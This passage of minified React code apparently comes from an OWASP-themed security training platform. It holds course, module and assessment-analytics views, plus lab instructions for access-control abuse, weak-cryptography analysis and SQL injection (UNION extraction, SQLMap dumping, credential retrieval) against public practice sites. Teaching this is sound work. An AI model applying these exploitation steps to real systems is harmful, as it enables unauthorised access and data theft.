space-x-2",children:[e.jsx(Pn,{className:"h-4 w-4"}),e.jsx("span",{children:"Lab"})]})}),e.jsx("button",{onClick:()=>d("test"),className:`py-3 px-6 rounded-lg font-medium text-sm transition-all ${c==="test"?"bg-[#00FF88] text-black":"text-[#00B37A] hover:text-[#00FF88] hover:bg-[#00FF88]/10"}`,children:e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx(Pe,{className:"h-4 w-4"}),e.jsx("span",{children:"Test"})]})})]})}),e.jsxs("div",{className:"p-6",children:[c==="content"&&e.jsxs("div",{className:"prose max-w-none text-[#EAEAEA]",children:[e.jsx("div",{dangerouslySetInnerHTML:{__html:F.content.replace(/\n/g,"<br/>").replace(/```([^`]+)```/g,'<pre class="bg-black border border-[#00FF88]/20 p-4 rounded-lg"><code class="text-[#00FF88] font-mono">$1</code></pre>').replace(/`([^`]+)`/g,'<code class="bg-black/50 px-1.5 py-0.5 rounded text-[#00FF88] font-mono">$1</code>').replace(/^# (.+)$/gm,'<h1 class="text-2xl font-bold mb-4 text-white">$1</h1>').replace(/^## (.+)$/gm,'<h2 class="text-xl font-bold mb-3 mt-6 text-white">$1</h2>').replace(/^### (.+)$/gm,'<h3 class="text-lg font-bold mb-2 mt-4 text-[#00FF88]">$1</h3>').replace(/^- (.+)$/gm,'<li class="ml-4 text-[#00B37A]">$1</li>').replace(/^(\d+)\. (.+)$/gm,'<li class="ml-4 text-[#00B37A]">$2</li>')}}),F.videoUrl&&e.jsxs("div",{className:"mt-8 bg-black/40 rounded-xl p-6 border border-[#00FF88]/10",children:[e.jsxs("h3",{className:"font-bold text-[#00FF88] mb-4 flex items-center space-x-2",children:[e.jsx(Bt,{className:"h-5 w-5"}),e.jsx("span",{children:"Video Lecture"})]}),e.jsx(Bd,{videoUrl:"https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4",title:`${F.title} - Video Lecture`,onProgress:O=>console.log("Video progress:",O),onComplete:()=>console.log("Video completed")})]})]}),c==="lab"&&F.labUrl&&e.jsxs("div",{className:"text-center py-12",children:[e.jsx("div",{className:"p-4 rounded-full bg-[#00FF88]/10 border border-[#00FF88]/20 w-20 h-20 mx-auto mb-6 flex items-center justify-center",children:e.jsx(Pn,{className:"h-10 w-10 text-[#00FF88]"})}),e.jsx("h3",{className:"text-xl font-bold text-white mb-4",children:"Hands-on Lab Environment"}),e.jsx("p",{className:"text-[#00B37A] mb-6 max-w-md mx-auto",children:"Practice what you've learned with interactive exercises and real-world scenarios in a safe sandbox environment."}),e.jsx("button",{className:"bg-[#00FF88] text-black px-8 py-3 rounded-lg font-bold hover:bg-[#00CC66] hover:shadow-[0_0_20px_rgba(0,255,136,0.3)] transition-all",children:"Launch Lab Environment"})]}),c==="test"&&e.jsxs("div",{className:"text-center py-12",children:[e.jsx("div",{className:"p-4 rounded-full bg-[#00FF88]/10 border border-[#00FF88]/20 w-20 h-20 mx-auto mb-6 flex items-center justify-center",children:e.jsx(ze,{className:"h-10 w-10 text-[#00FF88]"})}),e.jsx("h3",{className:"text-xl font-bold text-white mb-4",children:"Module Assessment"}),e.jsx("p",{className:"text-[#00B37A] mb-6 max-w-md mx-auto",children:"Test your understanding of this module with a focused quiz to validate your knowledge."}),F.testScore&&e.jsx("div",{className:"mb-6",children:e.jsxs("span",{className:"inline-flex items-center px-4 py-2 rounded-full text-sm font-medium bg-[#00FF88]/10 text-[#00FF88] border border-[#00FF88]/20",children:["Previous Score: ",F.testScore,"%"]})}),e.jsx("button",{onClick:()=>f(!0),className:"bg-[#00FF88] text-black px-8 py-3 rounded-lg font-bold hover:bg-[#00CC66] hover:shadow-[0_0_20px_rgba(0,255,136,0.3)] transition-all",children:F.testScore?"Retake Test":"Start Test"})]})]})]}),F.completed?e.jsx("div",{className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/20 p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{className:"flex items-center space-x-3",children:[e.jsx("div",{className:"p-2 rounded-lg bg-[#00FF88]/10 border border-[#00FF88]/20",children:e.jsx(Pe,{className:"h-6 w-6 text-[#00FF88]"})}),e.jsxs("div",{children:[e.jsx("h3",{className:"font-bold text-[#00FF88]",children:"Module Completed!"}),e.jsx("p",{className:"text-[#00B37A]",children:"You've successfully completed this training module."})]})]}),e.jsxs("button",{onClick:()=>f(!0),className:"text-[#00B37A] hover:text-[#00FF88] transition-colors flex items-center space-x-2 border border-[#00FF88]/20 px-4 py-2 rounded-lg hover:bg-[#00FF88]/10",children:[e.jsx(Pe,{className:"h-5 w-5"}),e.jsx("span",{children:"Retake Test"})]})]})}):e.jsx("div",{className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/10 p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("h3",{className:"font-bold text-white",children:"Ready to prove your skills?"}),e.jsx("p",{className:"text-[#00B37A]",children:"Take the assessment to complete this module."})]}),e.jsx("button",{onClick:()=>f(!0),className:"bg-[#00FF88] text-black px-6 py-3 rounded-lg font-bold hover:bg-[#00CC66] hover:shadow-[0_0_20px_rgba(0,255,136,0.3)] transition-all",children:"Take Module Test"})]})}),w&&T(w)&&e.jsx("div",{className:"bg-gradient-to-r from-[#0A0F0A] to-[#0A1A0A] rounded-xl border-2 border-[#00FF88]/30 p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{className:"flex items-center space-x-4",children:[e.jsx("div",{className:"p-3 rounded-full bg-[#00FF88]/10 border border-[#00FF88]/20",children:e.jsx(tt,{className:"h-10 w-10 text-[#00FF88]"})}),e.jsxs("div",{children:[e.jsx("h3",{className:"font-bold text-[#00FF88] text-lg",children:"Mission Complete!"}),e.jsx("p",{className:"text-[#00B37A]",children:"Congratulations, operative! You've completed all training modules."})]})]}),e.jsx("div",{className:"flex items-center space-x-3",children:S===R.length-1?e.jsxs("button",{onClick:H,className:"bg-[#00FF88] text-black px-6 py-3 rounded-lg font-bold hover:bg-[#00CC66] hover:shadow-[0_0_20px_rgba(0,255,136,0.3)] transition-all flex items-center space-x-2",children:[e.jsx(tt,{className:"h-5 w-5"}),e.jsx("span",{children:"Complete Course"})]}):e.jsxs("button",{onClick:()=>b(!0),className:"bg-[#00FF88] text-black px-6 py-3 rounded-lg font-bold hover:bg-[#00CC66] hover:shadow-[0_0_20px_rgba(0,255,136,0.3)] transition-all flex items-center space-x-2",children:[e.jsx(tt,{className:"h-5 w-5"}),e.jsx("span",{children:"View Certificate"})]})})]})}),p&&w&&x&&e.jsx(Xj,{isOpen:p,onClose:()=>b(!1),courseName:w.title,studentName:x.name||"Student",completionDate:new Date})]})})},n2=({courseId:a,onBack:n})=>{const[s,i]=v.useState(null),[o,c]=v.useState(null),[d,m]=v.useState(!1),{user:f}=Ie();v.useEffect(()=>{let N=!0;(async()=>{m(!0);try{const S=await lt.getCourseById(a);if(N&&S)if(f?.id)try{const z=(await lt.getUserProgress(f.id,a)||[]).reduce((O,V)=>(V.module_id&&(O[V.module_id]=V),O),{}),G=(S.course_modules??S.modules??[]).map(O=>({...O,completed:!!z[O.id]?.completed,testScore:z[O.id]?.quiz_score??O.testScore??void 0}));c({...S,course_modules:G})}catch(U){console.error("Failed to load user progress for course detail:",U),c(S)}else c(S)}catch(S){console.error("Failed to load course:",S)}finally{N&&m(!1)}})();const F=S=>{try{const U=S.detail;U?.moduleId&&i(U.moduleId)}catch(U){console.warn("navigateModule event parsing failed",U)}};window.addEventListener("navigateModule",F);const R=new URLSearchParams(window.location.search).get("module");return R&&i(R),()=>{N=!1,window.removeEventListener("navigateModule",F)}},[a,f]);const x=async()=>{try{const N=await lt.getCourseById(a);if(N)if(f?.id){const F=(await lt.getUserProgress(f.id,a)||[]).reduce((S,U)=>(U.module_id&&(S[U.module_id]=U),S),{}),R=(N.course_modules??N.modules??[]).map(S=>({...S,completed:!!F[S.id]?.completed,testScore:F[S.id]?.quiz_score??S.testScore??void 0}));c({...N,course_modules:R})}else c(N)}catch(N){console.error("Failed refreshing course:",N)}};if(d)return e.jsx("div",{className:"p-6 min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 flex items-center justify-center",children:e.jsxs("div",{className:"text-center",children:[e.jsx("div",{className:"animate-spin rounded-full h-12 w-12 border-b-2 border-[#00FF88] mx-auto mb-4"}),e.jsx("p",{className:"text-[#00B37A] font-mono",children:"LOADING MISSION DATA..."})]})});if(!o)return e.jsx("div",{className:"p-6 min-h-screen bg-gradient-to-br from-slate-900 to-slate-800",children:e.jsxs("div",{className:"max-w-4xl mx-auto text-center py-20",children:[e.jsx(He,{className:"h-16 w-16 text-red-500 mx-auto mb-4"}),e.jsx("h2",{className:"text-2xl font-bold text-white mb-2",children:"Course Not Found"}),e.jsx("p",{className:"text-[#00B37A] mb-6",children:"The requested training module does not exist."}),e.jsx("button",{onClick:n,className:"px-6 py-3 bg-[#00FF88] text-black font-bold rounded-lg hover:bg-[#00CC66] transition-colors",children:"Return to Courses"})]})});if(s)return e.jsx(s2,{courseId:a,moduleId:s,onBack:()=>i(null),onNavigateToModule:N=>i(N),onModuleStatusChange:x});const p=(o.modules??o.course_modules??[]).filter(N=>N.completed).length,b=(o.modules??o.course_modules??[]).length,w=p/b*100,j=(()=>{switch(f?.level){case"beginner":return 3;case"intermediate":return 7;case"advanced":return Number.POSITIVE_INFINITY;default:return 0}})();return e.jsx("div",{className:"p-6 min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 text-[#EAEAEA]",children:e.jsxs("div",{className:"max-w-6xl mx-auto space-y-6",children:[e.jsx("div",{className:"flex items-center space-x-4",children:e.jsxs("button",{onClick:n,className:"flex items-center space-x-2 text-[#00B37A] hover:text-[#00FF88] transition-colors group",children:[e.jsx(ys,{className:"h-5 w-5 group-hover:-translate-x-1 transition-transform"}),e.jsx("span",{className:"font-medium",children:"Back to Courses"})]})}),e.jsx("div",{className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/10 overflow-hidden",children:e.jsx("div",{className:"p-8",children:e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-3 gap-8",children:[e.jsxs("div",{className:"lg:col-span-2",children:[e.jsxs("div",{className:"flex items-center space-x-3 mb-3",children:[e.jsx("div",{className:"p-2 rounded-lg bg-[#00FF88]/10 border border-[#00FF88]/20",children:e.jsx(He,{className:"h-6 w-6 text-[#00FF88]"})}),e.jsx("h1",{className:"text-3xl font-bold text-white",children:o.title})]}),e.jsx("p",{className:"text-[#00B37A] text-lg mb-6",children:o.description}),e.jsxs("div",{className:"flex items-center flex-wrap gap-4 text-sm font-mono mb-6",children:[e.jsxs("div",{className:"flex items-center space-x-2 text-[#EAEAEA]/60",children:[e.jsx(Mt,{className:"h-4 w-4 text-[#00FF88]"}),e.jsxs("span",{children:[b," MODULES"]})]}),e.jsxs("div",{className:"flex items-center space-x-2 text-[#EAEAEA]/60",children:[e.jsx(Pt,{className:"h-4 w-4 text-[#00FF88]"}),e.jsxs("span",{children:["~",b*2," HOURS"]})]}),e.jsxs("div",{className:"flex items-center space-x-2 text-[#EAEAEA]/60",children:[e.jsx(Pn,{className:"h-4 w-4 text-[#00FF88]"}),e.jsx("span",{children:"HANDS-ON LABS"})]}),e.jsxs("div",{className:"flex items-center space-x-2 text-[#EAEAEA]/60",children:[e.jsx(tt,{className:"h-4 w-4 text-[#00FF88]"}),e.jsx("span",{children:"CERTIFICATE"})]})]}),e.jsxs("div",{className:"bg-black/40 rounded-xl p-4 border border-[#00FF88]/10",children:[e.jsx("h3",{className:"font-bold text-[#00FF88] mb-3 text-sm uppercase tracking-wider",children:"Mission Objectives"}),e.jsxs("ul",{className:"text-[#00B37A] space-y-2 text-sm",children:[e.jsxs("li",{className:"flex items-start space-x-2",children:[e.jsx(Yt,{className:"h-4 w-4 text-[#00FF88] mt-0.5 flex-shrink-0"}),e.jsx("span",{children:"Understand the OWASP Top 10 security vulnerabilities"})]}),e.jsxs("li",{className:"flex items-start space-x-2",children:[e.jsx(Yt,{className:"h-4 w-4 text-[#00FF88] mt-0.5 flex-shrink-0"}),e.jsx("span",{children:"Learn practical exploitation techniques"})]}),e.jsxs("li",{className:"flex items-start space-x-2",children:[e.jsx(Yt,{className:"h-4 w-4 text-[#00FF88] mt-0.5 flex-shrink-0"}),e.jsx("span",{children:"Master vulnerability prevention methods"})]}),e.jsxs("li",{className:"flex items-start space-x-2",children:[e.jsx(Yt,{className:"h-4 w-4 text-[#00FF88] mt-0.5 flex-shrink-0"}),e.jsx("span",{children:"Gain hands-on experience with security tools"})]}),e.jsxs("li",{className:"flex items-start space-x-2",children:[e.jsx(Yt,{className:"h-4 w-4 text-[#00FF88] mt-0.5 flex-shrink-0"}),e.jsx("span",{children:"Earn industry-recognized certification"})]})]})]})]}),e.jsxs("div",{className:"space-y-6",children:[e.jsxs("div",{className:"bg-black/40 rounded-xl p-6 border border-[#00FF88]/10",children:[e.jsx("h3",{className:"font-bold text-[#00B37A] mb-4 text-xs uppercase tracking-widest",children:"Mission Progress"}),e.jsxs("div",{className:"text-center mb-4",children:[e.jsxs("div",{className:"text-4xl font-bold text-[#00FF88] font-mono",children:[Math.round(w),"%"]}),e.jsx("div",{className:"text-[#00B37A] text-sm",children:"Complete"})]}),e.jsx("div",{className:"w-full bg-black rounded-full h-2 mb-4 border border-[#00FF88]/10",children:e.jsx("div",{className:"bg-[#00FF88] h-full rounded-full transition-all duration-500 shadow-[0_0_10px_rgba(0,255,136,0.5)]",style:{width:`${w}%`}})}),e.jsxs("div",{className:"text-sm text-[#00B37A] text-center font-mono",children:[p," / ",b," MODULES COMPLETED"]})]}),e.jsxs("div",{className:"bg-black/40 rounded-xl p-6 border border-[#00FF88]/10",children:[e.jsx("h3",{className:"font-bold text-[#00B37A] mb-4 text-xs uppercase tracking-widest",children:"Your Stats"}),e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{className:"text-[#00B37A]",children:"Modules Completed"}),e.jsxs("span",{className:"font-medium text-[#EAEAEA] font-mono",children:[p,"/",b]})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{className:"text-[#00B37A]",children:"Labs Completed"}),e.jsx("span",{className:"font-medium text-[#EAEAEA] font-mono",children:"2/6"})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{className:"text-[#00B37A]",children:"Average Score"}),e.jsx("span",{className:"font-medium text-[#00FF88] font-mono",children:"85%"})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{className:"text-[#00B37A]",children:"Time Spent"}),e.jsx("span",{className:"font-medium text-[#EAEAEA] font-mono",children:"12 hrs"})]})]})]})]})]})})}),e.jsxs("div",{className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/10 overflow-hidden",children:[e.jsx("div",{className:"border-b border-[#00FF88]/10 p-6",children:e.jsxs("h2",{className:"text-xl font-bold text-white flex items-center space-x-2",children:[e.jsx(He,{className:"h-5 w-5 text-[#00FF88]"}),e.jsx("span",{children:"Training Modules"})]})}),e.jsx("div",{className:"divide-y divide-[#00FF88]/10",children:(o.modules??o.course_modules??[]).map((N,k)=>{const F=k<j||f?.role==="admin";return e.jsx("div",{className:"p-6 hover:bg-[#00FF88]/5 transition-colors group",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{className:"flex items-start space-x-4 flex-1",children:[e.jsx("div",{className:"flex-shrink-0 mt-1",children:N.completed?e.jsx("div",{className:"h-8 w-8 rounded-full bg-[#00FF88]/10 border border-[#00FF88]/20 flex items-center justify-center",children:e.jsx(Pe,{className:"h-5 w-5 text-[#00FF88]"})}):F?e.jsx("div",{className:"h-8 w-8 rounded-full border border-[#00FF88]/30 flex items-center justify-center group-hover:border-[#00FF88] transition-colors",children:e.jsx("span",{className:"text-sm font-bold text-[#00B37A] font-mono",children:String(k+1).padStart(2,"0")})}):e.jsx("div",{className:"h-8 w-8 rounded-full bg-white/5 border border-white/10 flex items-center justify-center",children:e.jsx(vt,{className:"h-4 w-4 text-white/30"})})}),e.jsxs("div",{className:"flex-1",children:[e.jsx("h3",{className:`text-lg font-medium mb-1 ${F?"text-white group-hover:text-[#00FF88]":"text-white/30"} transition-colors`,children:N.title}),e.jsx("p",{className:`mb-3 ${F?"text-[#00B37A]":"text-white/20"}`,children:N.description}),e.jsxs("div",{className:`flex items-center space-x-4 text-sm ${F?"text-[#EAEAEA]/60":"text-white/20"}`,children:[e.jsxs("div",{className:"flex items-center space-x-1",children:[e.jsx(Mt,{className:"h-4 w-4"}),e.jsx("span",{children:"Reading"})]}),N.videoUrl&&e.jsxs("div",{className:"flex items-center space-x-1",children:[e.jsx(Bt,{className:"h-4 w-4"}),e.jsx("span",{children:"Video"})]}),N.labUrl&&e.jsxs("div",{className:"flex items-center space-x-1",children:[e.jsx(Pn,{className:"h-4 w-4"}),e.jsx("span",{children:"Lab"})]}),e.jsxs("div",{className:"flex items-center space-x-1",children:[e.jsx(Pt,{className:"h-4 w-4"}),e.jsx("span",{children:"~2 hours"})]})]}),N.testScore&&e.jsx("div",{className:"mt-2",children:e.jsxs("span",{className:"inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-[#00FF88]/10 text-[#00FF88] border border-[#00FF88]/20",children:["Test Score: ",N.testScore,"%"]})})]})]}),e.jsx("button",{onClick:()=>i(N.id),disabled:!F,className:`flex items-center space-x-2 px-5 py-2.5 rounded-lg font-bold transition-all ${F?"bg-[#00FF88] text-black hover:bg-[#00CC66] hover:shadow-[0_0_20px_rgba(0,255,136,0.3)]":"bg-white/5 border border-white/10 text-white/30 cursor-not-allowed"}`,children:F?e.jsxs(e.Fragment,{children:[e.jsx(Bt,{className:"h-4 w-4"}),e.jsx("span",{children:N.completed?"Review":"Start"})]}):e.jsxs(e.Fragment,{children:[e.jsx(vt,{className:"h-4 w-4"}),e.jsx("span",{children:"Locked"})]})})]})},N.id)})})]})]})})},Wm=()=>{const[a,n]=v.useState([]),[s,i]=v.useState([]),[o,c]=v.useState(!0);v.useEffect(()=>{d()},[]),v.useEffect(()=>{const p=Z.channel("assessment-analytics").on("postgres_changes",{event:"*",schema:"public",table:"assessment_responses"},()=>{d()}).on("postgres_changes",{event:"*",schema:"public",table:"users"},()=>{d()}).subscribe();return()=>{Z.removeChannel(p)}},[]);const d=async()=>{try{c(!0);const{data:p,error:b}=await Z.from("assessment_responses").select(`
          *,
          user:users(name, email, level)
        `).order("created_at",{ascending:!1});if(b)throw b;n(p||[]);const w=m(p||[]);i(w)}catch(p){console.error("Failed to load assessment data:",p)}finally{c(!1)}},m=p=>{const b=new Map;return p.forEach(w=>{b.has(w.question_id)||b.set(w.question_id,{responses:[],question_text:`Question ${w.question_id}`}),b.get(w.question_id).responses.push(w)}),Array.from(b.entries()).map(([w,j])=>{const N=j.responses,k=N.length,F=N.filter(G=>G.is_correct).length,T=N.reduce((G,O)=>G+O.confidence_level,0)/k,R=F/k,S=Math.round((1-R)*5),U=N.filter(G=>!G.is_correct),z=new Map;U.forEach(G=>{const O=typeof G.selected_answer=="number"?G.selected_answer:-1;z.set(O,(z.get(O)||0)+1)});const H=Array.from(z.entries()).map(([G,O])=>({answer:G,count:O})).sort((G,O)=>O.count-G.count).slice(0,3);return{question_id:w,question_text:j.question_text,total_responses:k,correct_responses:F,average_confidence:T,difficulty_rating:S,common_wrong_answers:H}}).sort((w,j)=>j.total_responses-w.total_responses)},f=p=>p>=4?"badge-strong-emerald":p>=3?"badge-emerald":p>=2?"badge-amber":"badge-danger",x=p=>p>=4?"badge-danger":p>=3?"badge-amber":p>=2?"badge-warning":"badge-emerald";return o?e.jsx("div",{className:"min-h-screen bg-page flex items-center justify-center",children:e.jsx("div",{className:"animate-spin rounded-full h-12 w-12 border-b-2 border-amber-500"})}):e.jsx("div",{className:"min-h-screen bg-page p-6",children:e.jsxs("div",{className:"max-w-7xl mx-auto",children:[e.jsxs("div",{className:"mb-8",children:[e.jsx("h1",{className:"text-4xl font-bold text-primary mb-2",children:"Assessment Analytics"}),e.jsx("p",{className:"text-muted",children:"Analyze student performance and confidence levels"})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-4 gap-6 mb-8",children:[e.jsx("div",{className:"bg-card border border-card rounded-2xl p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-muted text-sm font-medium",children:"Total Responses"}),e.jsx("p",{className:"text-3xl font-bold text-primary",children:a.length})]}),e.jsx(qv,{className:"h-12 w-12 accent-emerald"})]})}),e.jsx("div",{className:"bg-card border border-card rounded-2xl p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-muted text-sm font-medium",children:"Avg Accuracy"}),e.jsxs("p",{className:"text-3xl font-bold text-primary",children:[a.length>0?Math.round(a.filter(p=>p.is_correct).length/a.length*100):0,"%"]})]}),e.jsx(Pe,{className:"h-12 w-12 accent-emerald"})]})}),e.jsx("div",{className:"bg-card border border-card rounded-2xl p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-muted text-sm font-medium",children:"Avg Confidence"}),e.jsx("p",{className:"text-3xl font-bold text-primary",children:a.length>0?(a.reduce((p,b)=>p+b.confidence_level,0)/a.length).toFixed(1):"0.0"})]}),e.jsx(E0,{className:"h-12 w-12 accent-amber"})]})}),e.jsx("div",{className:"bg-card border border-card rounded-2xl p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-muted text-sm font-medium",children:"Unique Students"}),e.jsx("p",{className:"text-3xl font-bold text-primary",children:new Set(a.map(p=>p.user_id)).size})]}),e.jsx(Ut,{className:"h-12 w-12 accent-amber"})]})})]}),e.jsxs("div",{className:"bg-muted border border-card rounded-2xl p-6 mb-8",children:[e.jsx("h2",{className:"text-2xl font-bold text-primary mb-6",children:"Question Performance Analysis"}),e.jsx("div",{className:"overflow-x-auto",children:e.jsxs("table",{className:"w-full",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"border-b border-card",children:[e.jsx("th",{className:"text-left py-3 px-4 text-slate-300 font-medium",children:"Question"}),e.jsx("th",{className:"text-left py-3 px-4 text-slate-300 font-medium",children:"Responses"}),e.jsx("th",{className:"text-left py-3 px-4 text-slate-300 font-medium",children:"Accuracy"}),e.jsx("th",{className:"text-left py-3 px-4 text-slate-300 font-medium",children:"Avg Confidence"}),e.jsx("th",{className:"text-left py-3 px-4 text-slate-300 font-medium",children:"Difficulty"}),e.jsx("th",{className:"text-left py-3 px-4 text-slate-300 font-medium",children:"Actions"})]})}),e.jsx("tbody",{children:s.map(p=>e.jsxs("tr",{className:"border-b border-card/50 hover:bg-card",children:[e.jsxs("td",{className:"py-4 px-4",children:[e.jsxs("div",{className:"text-white font-medium",children:["Question ",p.question_id]}),e.jsx("div",{className:"text-slate-400 text-sm",children:p.question_text})]}),e.jsx("td",{className:"py-4 px-4 text-primary",children:p.total_responses}),e.jsx("td",{className:"py-4 px-4",children:e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsxs("span",{className:"text-primary",children:[Math.round(p.correct_responses/p.total_responses*100),"%"]}),p.correct_responses/p.total_responses>=.7?e.jsx(Pe,{className:"h-4 w-4 text-green-400"}):e.jsx(bs,{className:"h-4 w-4 text-red-400"})]})}),e.jsx("td",{className:"py-4 px-4",children:e.jsx("span",{className:`px-2 py-1 rounded-full text-xs font-medium ${f(p.average_confidence)}`,children:p.average_confidence.toFixed(1)})}),e.jsx("td",{className:"py-4 px-4",children:e.jsxs("span",{className:`px-2 py-1 rounded-full text-xs font-medium ${x(p.difficulty_rating)}`,children:[p.difficulty_rating,"/5"]})}),e.jsx("td",{className:"py-4 px-4",children:e.jsx("button",{onClick:()=>console.log("View details for",p.question_id),className:"text-primary hover:text-muted transition-colors",children:"View Details"})})]},p.question_id))})]})})]}),e.jsxs("div",{className:"bg-muted border border-card rounded-2xl p-6",children:[e.jsx("h2",{className:"text-2xl font-bold text-primary mb-6",children:"Recent Student Responses"}),e.jsx("div",{className:"space-y-4",children:a.slice(0,10).map(p=>e.jsx("div",{className:"bg-card rounded-xl p-4 border border-card",children:e.jsxs("div",{className:"flex items-start justify-between",children:[e.jsxs("div",{className:"flex-1",children:[e.jsxs("div",{className:"flex items-center space-x-3 mb-2",children:[e.jsx("div",{className:"text-primary font-medium",children:p.user?.name||"Unknown User"}),e.jsx("div",{className:"text-muted text-sm",children:p.user?.email}),e.jsx("span",{className:`px-2 py-1 rounded-full text-xs font-medium ${p.user?.level==="advanced"?"badge-danger":p.user?.level==="intermediate"?"badge-amber":"badge-emerald"}`,children:p.user?.level})]}),e.jsxs("div",{className:"text-slate-300 text-sm",children:["Question ",p.question_id,"  Answer: ",p.selected_answer,"  Time: ",p.time_taken_seconds,"s"]})]}),e.jsxs("div",{className:"flex items-center space-x-3",children:[e.jsxs("span",{className:`px-2 py-1 rounded-full text-xs font-medium ${f(p.confidence_level)}`,children:["Confidence: ",p.confidence_level,"/5"]}),p.is_correct?e.jsx(Pe,{className:"h-5 w-5 accent-emerald"}):e.jsx(bs,{className:"h-5 w-5 accent-amber"})]})]})},p.id))})]})]})})},ds=[{id:"broken-access-control",title:"Broken Access Control Lab",description:"Practice identifying and exploiting broken access control vulnerabilities",difficulty:"beginner",estimatedTime:"45 minutes",tools:["Browser","Burp Suite","OWASP ZAP"],liveUrl:"https://testphp.vulnweb.com/listproducts.php?cat=1",instructions:`
# Broken Access Control Lab

## Objective
Learn to identify and exploit broken access control vulnerabilities in web applications.

## Scenario
You have been given access to a vulnerable web application that contains several access control flaws. Your task is to identify and exploit these vulnerabilities in a live environment.

## Lab Environment
- Target Application: http://vulnerable-app.lab:8080
- Live containerized environment with real vulnerabilities
- Interactive terminal with security testing tools
- Real-time objective tracking

## Exercise 1: Horizontal Privilege Escalation
1. Log in as user1
2. Navigate to the user profile page
3. Try to access other users' profiles by manipulating the URL
4. Document what sensitive information you can access

## Exercise 2: Vertical Privilege Escalation
1. As a regular user, attempt to access admin functions
2. Look for hidden admin panels or functionality
3. Try parameter manipulation to gain elevated privileges

## Exercise 3: Insecure Direct Object References
1. Find functionality that references objects by ID
2. Attempt to access objects belonging to other users
3. Test for predictable object identifiers

## Tools Usage
- Burp Suite for request interception and modification
- OWASP ZAP for automated vulnerability scanning
- Custom exploitation scripts and payloads
- Network analysis tools

## Expected Findings
- User profile information disclosure
- Admin panel access
- Unauthorized data modification capabilities
- Business logic bypasses

## Live Environment Features
- Real vulnerable web application
- Interactive security testing terminal
- Objective-based progress tracking
- Immediate feedback on successful exploits

## Remediation
After completing the exercises, review the secure code examples and implement proper access controls.
    `,completed:!1},{id:"cryptographic-failures",title:"Cryptographic Failures Lab",description:"Identify weak cryptography and implement secure solutions",difficulty:"intermediate",estimatedTime:"60 minutes",tools:["OpenSSL","Wireshark","Browser Dev Tools"],liveUrl:"https://badssl.com",instructions:`
# Cryptographic Failures Lab

## Objective
Understand common cryptographic failures and learn to implement secure cryptographic solutions.

## Lab Environment
- Live vulnerable application with weak cryptography
- Network traffic analysis tools
- Cryptographic testing utilities
- Real-time vulnerability detection

## Exercise 1: Weak Encryption Detection
1. Analyze the application's use of encryption
2. Identify weak or deprecated algorithms
3. Find instances of plaintext transmission
4. Document encryption key management issues

## Exercise 2: Traffic Analysis
1. Use built-in packet capture tools
2. Identify unencrypted sensitive data transmission
3. Analyze SSL/TLS implementation weaknesses
4. Find certificate validation issues

## Exercise 3: Implement Secure Cryptography
1. Review the vulnerable code samples
2. Implement proper encryption using AES-256
3. Add secure key management
4. Implement proper random number generation

## Live Tools Available
- OpenSSL command-line tools
- Custom crypto analysis scripts
- Network packet capture
- Hash cracking utilities

## Common Issues to Find
- MD5/SHA1 usage for passwords
- Hardcoded encryption keys
- Weak random number generation
- Missing TLS validation
- Deprecated SSL/TLS versions

## Interactive Environment
- Real-time cryptographic analysis
- Live SSL/TLS testing
- Interactive hash cracking
- Immediate vulnerability feedback

## Success Criteria
- Identify all cryptographic weaknesses
- Successfully decrypt vulnerable data
- Implement secure alternatives
- Verify secure implementation
    `,completed:!1},{id:"injection",title:"SQL Injection Lab",description:"Master SQL injection techniques and prevention methods",difficulty:"intermediate",estimatedTime:"90 minutes",tools:["SQLMap","Burp Suite","Browser"],liveUrl:"https://juice-shop.herokuapp.com",instructions:`
# SQL Injection Lab

## Objective
Master various SQL injection techniques and learn effective prevention methods.

## Lab Environment
- Live vulnerable web application with MySQL backend
- Interactive SQL injection testing environment
- Real-time database interaction
- Multiple injection vectors to discover

## Exercise 1: Basic SQL Injection
1. Identify injectable parameters
2. Perform boolean-based blind injection
3. Extract database structure information
4. Retrieve sensitive data from the database

## Exercise 2: Union-Based Injection
1. Determine the number of columns
2. Find injectable union positions
3. Extract data using UNION SELECT
4. Download database contents

## Exercise 3: Automated Exploitation
1. Use built-in SQLMap for automated testing
2. Compare manual vs automated results
3. Dump database contents
4. Perform advanced exploitation techniques

## Live Testing Environment
- Interactive SQL injection terminal
- Real-time payload testing
- Automated vulnerability scanning
- Database content extraction tools

## Available Tools
- SQLMap with custom configurations
- Manual injection testing interface
- Database schema analysis tools
- Payload generation utilities

## Prevention Implementation
1. Review vulnerable PHP/Python code
2. Implement parameterized queries
3. Add input validation
4. Test the secure implementation

## Real-time Features
- Live database responses
- Interactive payload crafting
- Immediate exploitation feedback
- Progress tracking for each injection type

## Success Metrics
- Extract user credentials
- Access admin functionality
- Retrieve all database contents
- Successfully implement secure code
